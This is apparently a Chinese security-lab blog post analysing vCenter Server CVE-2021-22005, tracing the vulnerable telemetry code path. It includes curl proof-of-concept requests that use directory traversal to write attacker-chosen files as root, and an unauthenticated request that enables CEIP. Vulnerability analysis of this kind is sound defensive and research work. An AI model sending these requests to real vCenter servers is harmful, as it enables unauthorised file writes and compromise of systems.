lz520520@深蓝攻防实验室
2021-09-21补丁修复了如下一系列漏洞，其中CVE-2021-22005评分最高，可getshell，网上也有该漏洞的poc，所以接下来也对该漏洞做进一步分析。
    CVE-2021-22005 vCenter Server 任意文件上传（CVSSv3评分9.8）
    CVE-2021-21991：vCenter Server 本地提权漏洞（CVSSv3评分8.8）
    CVE-2021-22006：vCenter Server 反向代理绕过漏洞（CVSSv3评分8.3）
    CVE-2021-22011：vCenter Server未经身份验证的 API 端点漏洞（CVSSv3评分8.1）
    CVE-2021-22015：vCenter Server 本地提权漏洞（CVSSv3评分7.8）
    CVE-2021-22012：vCenter Server 未经身份验证的 API 信息泄露漏洞（CVSSv3评分7.5）
    CVE-2021-22013：vCenter Server 路径遍历漏洞（CVSSv3评分7.5）
    CVE-2021-22016：vCenter Server 反射型 XSS 漏洞（CVSSv3评分7.5）
    CVE-2021-22017：vCenter Server rhttpproxy 绕过漏洞（CVSSv3评分7.3）
    CVE-2021-22014：vCenter Server 身份验证代码执行漏洞（CVSSv3评分7.2）
    CVE-2021-22018：vCenter Server 文件删除漏洞（CVSSv3评分6.5）
    CVE-2021-21992：vCenter Server XML 解析拒绝服务漏洞（CVSSv3评分6.5）
    CVE-2021-22007：vCenter Server 本地信息泄露漏洞（CVSSv3评分5.5）
    CVE-2021-22019：vCenter Server 拒绝服务漏洞（CVSSv3评分5.3）
    CVE-2021-22009：vCenter Server VAPI 拒绝服务漏洞（CVSSv3评分5.3）
    CVE-2021-22010：vCenter Server VPXD 拒绝服务漏洞（CVSSv3评分5.3）
    CVE-2021-22008：vCenter Server 信息泄露漏洞（CVSSv3评分5.3）
    CVE-2021-22020：vCenter Server Analytics 服务拒绝服务漏洞（CVSSv3评分5.0）
    CVE-2021-21993：vCenter Server SSRF 漏洞（CVSSv3评分4.3）
## 参考
任意文件上传  
官方提供的测试脚本，算是一个漏洞扫描+临时补丁  
根据提示漏洞接口应该如下
    rep = requests.post(self.url + "/analytics/telemetry/ph/api/hyper/send?_c&_i=test",
                                    headers={"Content-Type": "application/json"}, data="lorem ipsum")
    /analytics/ph/api/dataapp/agent?_c=test&_i=1
    /analytics/ph/api/dataapp/agent?action=collect&_c=test&_i=1
    /analytics/telemetry/ph/api/hyper/send
    /analytics/ph/api/dataapp/agent
vmware公开的poc  
    curl -X POST "https://localhost/analytics/telemetry/ph/api/hyper/send?_c&_i=test" -d "Test_Workaround" -H "Content-Type: application/json"
    # 实际接口
    curl -X POST "http://localhost:15080/analytics/telemetry/ph/api/hyper/send?_c&_i=test" -d "Test_Workaround" -H "Content-Type: application/json"
    # CEIP是否开启
    curl -k -v "https://192.168.111.11/analytics/telemetry/ph/api/level?_c=test"
    # 请求
    curl -kv "https://192.168.111.11/analytics/telemetry/ph/api/hyper/send?_c=&_i=/stuff" -H "Content-Type: application/json" -d ""
    # 创建一个json文件
    /var/log/vmware/analytics/prod/_c_i/stuff.json
    # 目录遍历
    curl -kv "https://192.168.111.11/analytics/telemetry/ph/api/hyper/send?_c=&_i=/../../../../../../tmp/foo" -H "Content-Type: application/json" -d "contents here will be directly written to /tmp/foo.json as root"
    curl -X POST "http://localhost:15080/analytics/telemetry/ph/api/hyper/send?_c&_i=test" -d "Test_Workaround" -H "Content-Type: application/json" -v 2>&1 | grep HTTP
## 影响范围
    vCenter Server 7.0 < 7.0 U2c
    vCenter Server 6.7 < 6.7 U3o
    Cloud Foundation (vCenter Server) 4.x < KB85718 (4.3)
    Cloud Foundation (vCenter Server) 3.x < KB85719 (3.10.2.2)
    6.7 Windows 不受影响
## 漏洞分析
### TelemetryLevelBasedTelemetryServiceWrapper请求入口
根据poc提示接口/analytics/telemetry/ph/api/hyper/send，找到对应的类
    analytics-push-telemetry-server-6.7.0.jar#com.vmware.ph.phservice.push.telemetry.server.AsyncTelemetryController.class
这个类是springboot的controller，找到漏洞URI，可以看到提交的两个参数`_c`和`_i`对应的是collectorId和collectorInstanceId  
继续跟踪到`TelemetryLevelBasedTelemetryServiceWrapper#processTelemetry`  
`TelemetryLevelBasedTelemetryServiceWrapper`是在`AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable`类里调用，这个类是Runnable实现类，用于多线程调用，所以通过该类的run方法进一步跟踪到`processTelemetry`的。  
生成一个Telemetrylevel对象，TelemetryLevel是一个枚举类型，这里会判断`TelemetryLevel.OFF`是否不等，继续看一下OFF是怎么设置的
    public enum TelemetryLevel {
        OFF,
        BASIC,
        FULL;
        private TelemetryLevel() {
        }
    }
调用堆栈
    processTelemetry:44, TelemetryLevelBasedTelemetryServiceWrapper (com.vmware.ph.phservice.push.telemetry)
    run:66, AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable (com.vmware.ph.phservice.push.telemetry.internal.impl)
    call:511, Executors$RunnableAdapter (java.util.concurrent)
    run:266, FutureTask (java.util.concurrent)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
### ceip
#### getTelemetryLevel
    getTelemetryLevel:56, DefaultTelemetryLevelService (com.vmware.ph.phservice.push.telemetry)
    processTelemetry:40, TelemetryLevelBasedTelemetryServiceWrapper (com.vmware.ph.phservice.push.telemetry)
    run:66, AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable (com.vmware.ph.phservice.push.telemetry.internal.impl)
    call:511, Executors$RunnableAdapter (java.util.concurrent)
    run:266, FutureTask (java.util.concurrent)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)、
`this._telemetryLevelService.getTelemetryLevel`定位到如下，可以看到这里会判断ceip（Customer
Experience Improvement Program）是否开启  
DefaultTelemetryLevelService  
其实ceip是客户体验提升计划，不一定开启。点击加入开启后，其实对提交的`_C`是有要求的  
如下`_C`为111返回还是off，所以参数有要求的  
查看漏洞利用目录`/var/log/vmware/analytics/prod`下有一个json文件  
其实是如此拼接成的，所以
    _c + vSphere.vapi.6_7 + _i + 9D36C850-1612-4EC4-B8DD-50BA239A25BB.json
再次测试可发现返回FULL了  
或者通过该接口请求测试是否正常，这个请求会生成ceip缓存，后续请求就不会再发送ceip到vmware了。
    curl -k -v "https://192.168.111.11/analytics/telemetry/ph/api/level?_c=vSphere.vapi.6_7"
* * *
这里再继续分析下getTelemetryLevel，他会先判断ceip是否开启，如果没开启，则直接返回`OFF`，如果为true，则进行判断。  
这里有个变量`this._collectorToTelemetryLevelCache`来存储collectorAgent对象（基于`_c`和`_i`生成），如果缓存里有了，就不会再次发遥测请求，_collectorToTelemetryLevelCache在这里是SimpleTimeBasedCacheImpl类，内部实际存储collectorAgent是用的hashmap。  
这里通过get获取key（即collectorAgent），所以看看hashCode怎么实现的。  
其实可以看到和`_collectorId`和`_collectorInstanceId`都相关。
    public int hashCode() {
            int hash = this._collectorId.hashCode();
            if (this._collectorInstanceId != null) {
                hash = hash * 31 + this._collectorInstanceId.hashCode();
            }
            return hash;
        }
做个测试，`_c`和`_i`，如下就是不同缓存
    CollectorAgent c1 = new CollectorAgent("vSphere.vapi.6_7", "c1");
    CollectorAgent c2 = new CollectorAgent("vSphere.vapi.6_7", "c2");
    this._collectorToTelemetryLevelCache.put(c1, telemetryLevel);
    this._collectorToTelemetryLevelCache.get(c2);
#### getTelemetryLevelFromManifest
    getTelemetryLevelFromManifest:82, DefaultTelemetryLevelService (com.vmware.ph.phservice.push.telemetry)
    getTelemetryLevel:69, DefaultTelemetryLevelService (com.vmware.ph.phservice.push.telemetry)
    processTelemetry:40, TelemetryLevelBasedTelemetryServiceWrapper (com.vmware.ph.phservice.push.telemetry)
    run:66, AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable (com.vmware.ph.phservice.push.telemetry.internal.impl)
    call:511, Executors$RunnableAdapter (java.util.concurrent)
    run:266, FutureTask (java.util.concurrent)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
那么再看看DefaultTelemetryLevelService#getTelemetryLevelFromManifest怎么发送遥测请求的，代码如下  
manifestContentProvider.getManifestContent请求返回有以下几种情况
  1. collectorId和collectorInstanceId随机，抛出异常，INVALID_COLLECTOR_ERROR,这里提示collectors ID不在白名单内
  1. collectorId为vSphere.vapi.6_7，抛出异常，GENERAL_ERROR，404
  1. 再第一次请求后，如果修改参数`_i`(collectorInstanceId)，后续二次请求都会报这个错
上面请求最终跟踪到如下位置com.vmware.ph.upload.rest.PhRestClientImpl#getManifest，GET请求  
手动发送，和之前获取的确实一样。  
有效请求  
PS: 这里在处理返回数据，会调用json进行反序列化，转换成com.vmware.ph.model.exceptions.ServiceException  
`DefaultTelemetryLevelService#getTelemetryLevelFromManifest`，我们看下抛出异常后再次调用`getTelemetryLevelForFailedManifestRetrieval`，如果异常是`INVALID_COLLECTOR_ERROR`，那么直接返回OFF，如果不是就返回FULL，defaultTelemetryLevel初始化的时候为FULL。  
所以如果首次请求的collectorId不对，那么即时开了ceip也是无法利用成功，但第二次还是可以成功，所以网上一些分析文章collectorId随机也是可以用的，但如果之前没有发送过遥测请求，就会利用失败，所以建议collectorId还是设置一个有效的。  
#### 开启ceip
经过测试，开启CEIP的接口无认证要求，可未授权访问
    curl -kv -X PUT "https://192.168.111.11/ui/ceip-ui/ctrl/ceip/status/true" -d "{}" -H "Content-Type: application/json"
PS: 但上面这个测试如果系统启动后没有登录过，请求不会成功  
调试发现，虽然接口请求不需要认证，但修改操作仍然需要session，只有在有人登录过，这个未授权请求才能生效。  
该请求对应的类在`./plugin-packages/telemetry/plugins/h5-ceip.war`  